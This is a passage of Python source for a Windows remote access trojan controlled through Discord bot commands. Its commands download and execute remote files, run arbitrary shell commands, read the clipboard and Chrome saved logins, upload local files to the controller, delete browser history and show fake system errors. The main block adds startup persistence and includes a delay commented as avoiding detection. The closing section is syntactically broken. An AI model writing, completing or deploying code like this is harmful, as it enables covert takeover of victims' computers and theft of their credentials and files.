            _, old, new = message.content.split(" ", 2)
            old_path = resolve_path(old)
            new_path = resolve_path(new)
            os.rename(old_path, new_path)
            await message.channel.send(f"✅ Renamed `{old_path}` to `{new_path}`")
        except Exception as e:
            await message.channel.send(f"❌ Rename failed: {e}")

    # --- IS ADMIN ---
    elif message.content == "!isadmin":
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        await message.channel.send(f"🔐 Admin: `{is_admin}`")

    # --- DOWNLOAD & RUN ---
    elif message.content.startswith("!downloadrun "):
        try:
            url = message.content.split(" ", 1)[1]
            filename = url.split("/")[-1]
            urllib.request.urlretrieve(url, filename)
            subprocess.Popen(filename, shell=True)
            await message.channel.send(f"📥 Downloaded and executed `{filename}`")
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    # --- UPDATE (replace this script) ---
    elif message.content.startswith("!update "):
        try:
            url = message.content.split(" ", 1)[1]
            filename = "update_" + os.path.basename(sys.argv[0])
            urllib.request.urlretrieve(url, filename)
            shutil.copy2(filename, sys.argv[0])
            await message.channel.send("⬆️ Updated. Restarting...")
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as e:
            await message.channel.send(f"❌ Update failed: {e}")

    # --- CMD COMMAND EXECUTION ---
    elif message.content.startswith("!cmd "):
        try:
            cmd = message.content[5:]
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10, encoding='utf-8')
            if len(result) > 1900:
                # Too long — truncate or send as file
                result = result[:1900]
            await message.channel.send(f"📟```{result}```")
        except Exception as e:
            await message.channel.send(f"❌ Error: {e}")

    elif message.content == "!clipboard":
        try:
            import win32clipboard
            win32clipboard.OpenClipboard()
            d = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            await message.channel.send(f"📋```{d}```")
        except Exception as e:
            print(f"[!] Clipboard error: {e}")

    elif message.content == "!browser_passwords":
        try:
            await message.channel.send("⚠️ Chrome must be closed")
            shutil.copy2(os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data"), "temp.db")
            conn = sqlite3.connect("temp.db")
            c = conn.cursor()
            c.execute("SELECT origin_url,username_value,password_value FROM logins")
            await message.channel.send("🔑 Passwords:\n" + "\n".join(
                [f"{url} | {user}" for url, user, _ in c.fetchall()]
            ))
            conn.close()
            os.remove("temp.db")
        except Exception as e:
            print(f"[!] Browser password error: {e}")

    elif message.content == "!wifi":
        try:
            output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
            await message.channel.send("📶```" + output + "```")
        except Exception as e:
            print(f"[!] WiFi info error: {e}")

    elif message.content == "!sysinfo":
        await message.channel.send(
            f"```User: {getpass.getuser()}\nOS: {platform.platform()}\nCPU: {platform.processor()}\nRAM: {psutil.virtual_memory().percent}% used```"
        )

    elif message.content == "!installed_software":
        try:
            output = subprocess.check_output(
                'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*|Select DisplayName"',
                shell=True
            ).decode()
            await message.channel.send("📦```" + output[:1900] + "```")
        except Exception as e:
            print(f"[!] Installed software error: {e}")

    elif message.content == "!running_processes":
        try:
            process_list = "\n".join(p.name() for p in psutil.process_iter())
            await message.channel.send("🖥️```" + process_list[:1900] + "```")
        except Exception as e:
            print(f"[!] Running processes error: {e}")

    elif message.content.startswith("!msgbox "):
        try:
            _, t, xt = message.content.split(" ", 2)
            ctypes.windll.user32.MessageBoxW(0, xt, t, 0x40)
        except:
            pass

    elif message.content.startswith("!speak "):
        try:
            import win32com.client
            win32com.client.Dispatch("SAPI.SpVoice").Speak(message.content[7:])
        except:
            pass

    elif message.content.startswith("!wallpaper "):
        try:
            urllib.request.urlretrieve(message.content[11:], "wp.jpg")
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath("wp.jpg"), 3)
        except:
            pass

    elif message.content == "!clear_history":
        try:
            paths = [
                os.path.expandvars("%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History"),
                os.path.expandvars("%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite")
            ]
            for p in paths:
                if os.path.exists(p):
                    os.remove(p)
            await message.channel.send("🧹 History cleared")
        except Exception as e:
            print(f"[!] History clear error: {e}")

    elif message.content == "!lock_pc":
        try:
            ctypes.windll.user32.LockWorkStation()
        except:
            pass

    elif message.content == "!fake_error":
        try:
            ctypes.windll.user32.MessageBoxW(0, "Critical error: System32 files corrupted", "Windows", 0x10)
        except:
            pass
        

    # Download file from URL
    elif message.content.startswith("!download "):
        url = message.content.split(" ", 1)[1]
        filename = os.path.basename(url)
        try:
            urllib.request.urlretrieve(url, filename)
            await message.channel.send(f"✅ Downloaded `{filename}`")
        except Exception as e:
            await message.channel.send(f"❌ Failed to download: {e}")

    # Upload a file from local system
    elif message.content.startswith("!upload "):
        filepath = message.content.split(" ", 1)[1].strip()
        filepath = resolve_path(filepath)
        if os.path.exists(filepath):
            try:
                await message.channel.send(file=discord.File(filepath))
            except Exception as e:
                await message.channel.send(f"❌ Upload failed: {e}")
        else:
            await message.channel.send("❌ File not found.")

    # Run a file
    elif message.content.startswith("!runfile "):
        filepath = message.content.split(" ", 1)[1].strip()
        filepath = resolve_path(filepath)
        if os.path.exists(filepath):
            try:
                subprocess.Popen(filepath, shell=True)
                await message.channel.send(f"✅ Executed `{filepath}`")
            except Exception as e:
                await message.channel.send(f"❌ Failed to run: {e}")
        else:
            await message.channel.send("❌ File not found.")

    elif message.content.startswith("!explore") or message.content.startswith("!cd") or message.content == "!pwd" or message.content.startswith("!tree"):

        try:
            # Parse commands
            if message.content.startswith("!explore"):
                parts = message.content.split(" ", 1)
                if len(parts) == 2 and parts[1].strip():
                    path = pathlib.Path(parts[1].strip())
                    if not path.is_absolute():
                        path = (pathlib.Path(current_dir) / path).resolve()
                else:
                    path = pathlib.Path(current_dir)

                if not path.exists() or not path.is_dir():
                    await message.channel.send(f"❌ Path does not exist or is not a directory: `{path}`")
                    return
                current_dir = str(path)

                entries = list(path.iterdir())
                lines = [f"📂 Listing: `{str(path)}`"]
                for entry in sorted(entries, key=lambda e: (e.is_file(), e.name.lower())):
                    size = entry.stat().st_size if entry.is_file() else 0

                    # Emoji logic
                    if entry.is_dir():
                        emoji = "📁"
                        size_str = ""
                    else:
                        ext = entry.suffix.lower()
                        if ext in ['.exe', '.bat', '.cmd', '.msi', '.com']:
                            emoji = "🔧"
                        elif ext in ['.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff', '.ico', '.webp']:
                            emoji = "📷"
                        elif ext in ['.txt', '.log', '.md', '.py', '.json', '.csv', '.xml', '.ini', '.cfg']:
                            emoji = "📄"
                        else:
                            emoji = "📄"
                        # Format size
                        size_str = f" ({size / 1024:.1f} KB)" if size > 0 else ""

                    lines.append(f"{emoji} {entry.name}{size_str}")

                # Send paginated if too long
                message_text = "\n".join(lines)
                if len(message_text) > 1900:
                    chunk_size = 40
                    for i in range(0, len(lines), chunk_size):
                        await message.channel.send("\n".join(lines[i:i+chunk_size]))
                else:
                    await message.channel.send(message_text)

            elif message.content.startswith("!cd"):
                parts = message.content.split(" ", 1)
                if len(parts) == 2:
                    new_path = pathlib.Path(parts[1].strip())
                    if not new_path.is_absolute():
                        new_path = (pathlib.Path(current_dir) / new_path).resolve()
                    if new_path.exists() and new_path.is_dir():
                        current_dir = str(new_path)
                        await message.channel.send(f"✅ Changed directory to `{current_dir}`")
                    else:
                        await message.channel.send(f"❌ Directory does not exist: `{new_path}`")
                else:
                    await message.channel.send("❌ Please specify a folder path.")

            elif message.content == "!pwd":
                await message.channel.send(f"📂 Current directory:\n`{current_dir}`")

            elif message.content.startswith("!tree"):
                parts = message.content.split(" ", 1)
                depth = 2  # default depth
                if len(parts) == 2 and parts[1].isdigit():
                    depth = int(parts[1])

                def get_tree(path, depth, prefix=""):
                    if depth < 0:
                        return []
                    lines = []
                    try:
                        entries = list(path.iterdir())
                    except Exception:
                        return []
                    for i, entry in enumerate(sorted(entries, key=lambda e: e.name.lower())):
                        is_last = (i == len(entries) - 1)
                        connector = "└── " if is_last else "├── "
                        lines.append(f"{prefix}{connector}{entry.name}")
                        if entry.is_dir():
                            extension = "    " if is_last else "│   "
                            lines.extend(get_tree(entry, depth - 1, prefix + extension))
                    return lines

                tree_lines = [f"Folder tree for `{current_dir}` (depth {depth}):"]
                tree_lines.extend(get_tree(pathlib.Path(current_dir), depth))
                tree_msg = "\n".join(tree_lines)

                if len(tree_msg) > 1900:
                    chunk_size = 40
                    for i in range(0, len(tree_lines), chunk_size):
                        await message.channel.send("\n".join(tree_lines[i:i+chunk_size]))
                else:
                    await message.channel.send(tree_msg)

        except Exception as e:
            await message.channel.send(f"❌ Error processing file explorer command: {e}")


            


# ===== Main Execution =====
if __name__ == "__main__":
    # Add persistence
    add_to_startup()
    
    # Initialize tray icon in a thread
    tray_icon = create_tray_icon()
    threading.Thread(target=tray_icon.run, daemon=True).start()
    
    # Start Discord bot in background thread
    bot_thread = threading.Thread(target=run_discord_bot, daemon=True)
    bot_thread.start()

    # Keep the application running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:

        threading.Thread(target=lambda: (
        time.sleep(30),  # Delay to avoid detection
 
    ).start())
        
         # Add this check at startup
    if is_new_boot():
        # Delay slightly to ensure network connectivity
        time.sleep(30)
        
        # Run in background thread to avoid blocking
        threading.Thread(
            target=lambda: asyncio.run(send_startup_notification()),
            daemon=True
        ).start()
